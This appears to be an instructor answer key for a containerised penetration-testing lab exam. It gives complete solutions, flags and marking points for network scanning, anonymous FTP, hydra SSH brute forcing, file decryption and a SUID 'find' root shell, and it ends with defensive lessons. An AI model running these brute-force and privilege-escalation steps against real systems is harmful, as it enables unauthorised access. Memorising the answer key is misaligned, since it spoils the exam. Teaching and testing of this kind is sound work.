# Solari Analytics Alt-Exam - Instructor Walkthrough & Answer Key

This document provides complete solutions for educators running the
Solari Analytics alternative-midterm lab. It is the companion exam to
`labs/midterm2026/` for students who could not sit the original midterm —
same 6-phase shape (recon → web enum → FTP → SSH → file analysis →
privesc), genuinely different scenario, credentials, and
privilege-escalation vector, so it isn't solvable by copying answers
from the original exam.

**Point distribution differs deliberately from `labs/midterm2026/`:**
Phases 1–2 (Reconnaissance + Web Application Enumeration) are weighted
at 50 of the 100 points. A student who completes those two phases fully
— which requires capturing the first flag, `flag{altmidterm_web_recon}`
— has already banked half the exam, regardless of how far they get
afterward. This rewards solid fundamentals (recon, enumeration) even for
students who don't reach SSH cracking or privilege escalation, while
still letting stronger students earn the remaining 50 points through
the full chain.

## Answer Key (For Marking)

Maps directly to the worksheet's phases, sections, and point values in
`AltMidterm2026.md`.

### Phase 1: Reconnaissance (30 points)

**1.1 Network Discovery (13 points)** — Command: `nmap -sn 10.10.11.0/24`
| IP Address | Hostname | Status |
|------------|----------|---------|
| 10.10.11.1 | (docker bridge gateway) | up |
| 10.10.11.2 | kali-attacker (self) | up |
| 10.10.11.10 | target-web | up |
| 10.10.11.11 | target-ssh | up |
| 10.10.11.12 | target-ftp | up |
| 10.10.11.13 | target-smtp | up |
| 10.10.11.14 | target-mail | up |
Worksheet table has 3 rows — full credit for any 3 of the 5 real targets.

**1.2 Port Scanning (17 points)** — Command: `nmap -sC -sV 10.10.11.10 10.10.11.11 10.10.11.12 10.10.11.13 10.10.11.14`
| Host | Port | Service | Version |
|------|------|---------|---------|
| 10.10.11.10 | 80 | http | Apache httpd (2.4.x) |
| 10.10.11.11 | 22 | ssh | OpenSSH |
| 10.10.11.12 | 21 | ftp | vsftpd |
| 10.10.11.13 | 1025 | smtp | Mailpit ESMTP |
| 10.10.11.13 | 8025 | http | Mailpit Web UI |
| 10.10.11.14 | 110 | pop3 | Dovecot |
| 10.10.11.14 | 143 | imap | Dovecot |
Worksheet table has 5 rows — full credit for any 5 of these 7.

### Phase 2: Web Application Enumeration (20 points)

**2.1 Web Content Analysis (13 points)** — Command: `curl http://10.10.11.10`
| Full Name | Email | Potential Username |
|-----------|-------|-------------------|
| Nora Chen | nchen@solari-analytics.com | nchen |
| Omar Patel | opatel@solari-analytics.com | opatel |
| Priya Shah | pshah@solari-analytics.com | pshah |
| Quinn Rivera | qrivera@solari-analytics.com | qrivera |
| Sam Ito | sito@solari-analytics.com | sito |
**Flag captured:** `flag{altmidterm_web_recon}` — HTML comment at the end
of the page; only visible via `curl`/view-source, not the rendered page.

**2.2 Username Generation (7 points)** — any list containing the 5
usernames above (`nchen`, `opatel`, `pshah`, `qrivera`, `sito`).

### Phase 3: FTP Enumeration (9 points)

**3.1 FTP Access (5 points)**
Connection: `ftp 10.10.11.12`. Auth: `anonymous` / `anonymous` (or blank
password). Success: Yes.
**Flag captured:** `flag{altmidterm_ftp_anon_access}` — `pub/flag.txt`.

**3.2 FTP File Discovery (4 points)**
Directories: `pub/`, `pub/incoming/`.
| Filename | Size | Location | Downloaded |
|----------|------|----------|------------|
| flag.txt | 33 bytes | pub/ | — |
| client_contracts_q3.csv.enc | ~330 bytes | pub/incoming/ | ✓ (required) |
Full credit requires the encrypted contracts file downloaded — needed for
Phase 5.

### Phase 4: SSH Attack (16 points)

**4.1 Password List Creation (4 points)** — top 10 lines of
`/usr/share/wordlists/rockyou.txt` plus each discovered username with a
short numeric suffix appended (`nchen`→`nchen01`, etc. — try `01`, `1`,
`123`). Credit if the list includes `nchen01` by any reasonable
username+suffix method. This is a deliberately different weak-password
idiom from the original midterm (which used reversed usernames) — do not
award credit for a student who only tried reversal, that's the *other*
exam's pattern.

**4.2 SSH Brute Force (8 points)** — Command:
`hydra -L users.txt -P passwords.txt 10.10.11.11 ssh -t 4`
**Successful credentials:** `nchen` / `nchen01`.

**4.3 SSH Access (4 points)** — Login successful: Yes.
```
whoami: nchen
id: uid=1001(nchen) gid=1001(nchen) groups=1001(nchen)
```
**Flag captured:** `flag{altmidterm_ssh_foothold}` — `/home/nchen/user.txt`.

### Phase 5: File Analysis (13 points)

**5.1 System Exploration (4 points)** — any reasonable discovery commands
(`ls -la`, `find . -name "*.txt" -o -name "*.csv"`, `sudo -l`). `sudo -l`
should come back empty/denied for `nchen` — there is no sudo
misconfiguration in this exam (unlike the original midterm). That's
expected; the privesc vector here is the SUID bit, found in Phase 6.

**5.2 File Decryption (9 points)**
Encrypted file: `client_contracts_q3.csv.enc`.
**Successful password:** `ComplianceOfficer2024`.
```bash
openssl enc -aes-256-cbc -d -salt -in client_contracts_q3.csv.enc -out client_contracts_q3.csv -k "ComplianceOfficer2024"
```
**Decrypted content (first 3 lines):**
```
Client Name,Contract Value,Renewal Date,Account Manager
Beacon Retail Group,142000,2025-02-01,Omar Patel
Harborline Shipping,98500,2025-04-15,Quinn Rivera
```
**Flag captured:** `flag{altmidterm_file_decrypted}` — last line of the
decrypted CSV.

### Phase 6: Privilege Escalation (12 points)

**6.1 SUID Binary Enumeration (4 points)** — Command:
```bash
find / -perm -4000 -type f 2>/dev/null
```
**SUID binary found (not stock):** `/usr/bin/find`. GTFOBins documents
that SUID `find` can spawn a shell via `-exec`, and because the SUID bit
makes it run with the file owner's privileges (root) regardless of who
invokes it, the spawned shell inherits root too. Same underlying
primitive as week8's `lowpriv`/`find` box — this exam reuses that vector
instead of midterm2026's sudo-NOPASSWD-on-`cat`, which is the point of
"complete different lab."

**6.2 Root Exploitation (4 points)** — Command:
```bash
find . -exec /bin/sh -p \; -quit
whoami   # root
cat /root/root.txt
```
**Flag captured:** `flag{altmidterm_root_privesc}`
Common student mistake: dropping `-p` — `/bin/sh` on this image is
`dash`, which drops effective privileges back to the real uid at startup
unless told not to via `-p`. If a student reports the exploit "ran but
I'm still nchen," check for the missing `-p` first; `id` is a more
reliable check than `whoami` here (shows `euid=0(root)`).

**6.3 Reflection (4 points)** — any answer that identifies: the SUID bit
means the binary always runs with its *owner's* privileges (root), not
the invoking user's; `find`'s `-exec` feature was never meant to be run
this way, but because `find` itself executes as root, whatever it execs
inherits that privilege — `-p` on `sh` additionally tells the shell not
to drop back to the real uid. Full credit for citing GTFOBins or naming
the general principle (SUID + a command-execution primitive = root,
regardless of which binary).

## Lab Setup Verification

```bash
docker compose up -d
docker exec -it altmidterm2026-attacker bash
nmap -sn 10.10.11.0/24
```

## Common Student Errors & Troubleshooting

### Error: "Connection Refused"
**Cause:** Student using wrong IP address/port.
**Solution:** Ensure using correct IP addresses discovered from network
scan. From inside the attacker container, services are on their real
ports (22, 21, 80) — the host-port mappings (2223, 2121, 8080, etc.) are
only for reaching the lab from outside Docker.

### Error: "Hydra shows no results"
**Cause:** Wrong password idiom tried. Remind students this exam's weak
password is a suffix, not a reversal.

### Error: "FTP file not found"
**Cause:** Forgot the `pub/` prefix — anon_root is `/var/ftp`, files live
under `pub/` and `pub/incoming/`.

### Error: "find -exec spawns a shell but whoami still shows nchen"
**Cause:** Missing `-p` flag — `dash` drops privileges without it.
**Solution:** `find . -exec /bin/sh -p \; -quit`

## Assessment Rubric

### Basic Level (Pass)
- [ ] Successfully discovers open ports
- [ ] Extracts usernames from website
- [ ] Connects to FTP anonymously
- [ ] Downloads encrypted file

### Intermediate Level (Credit)
- [ ] Successfully brute forces SSH
- [ ] Gains SSH access with nchen account
- [ ] Decrypts contracts file
- [ ] Documents findings clearly

### Advanced Level (Distinction)
- [ ] Enumerates all services thoroughly
- [ ] Identifies the username+suffix password pattern
- [ ] Finds the SUID `find` binary and escalates to root
- [ ] Provides detailed security recommendations

## Security Lessons Learned

### Key Vulnerabilities Demonstrated
1. **Information Disclosure:** Employee data exposed on website
2. **Weak Authentication:** Easily guessable SSH password (username + suffix)
3. **Anonymous FTP:** Sensitive files accessible without authentication
4. **Weak Encryption:** Predictable encryption password
5. **SUID Misconfiguration:** `find` with the SUID bit set, exploitable via GTFOBins

### Defensive Recommendations Students Should Identify
1. Remove employee details from public website
2. Implement strong password policies (block username-derived passwords)
3. Disable anonymous FTP access
4. Use strong, non-guessable encryption keys
5. Audit SUID binaries regularly (`find / -perm -4000`) and remove the
   bit from anything that doesn't need it
6. Regular security audits and penetration testing

## Lab Cleanup
```bash
docker compose down
```
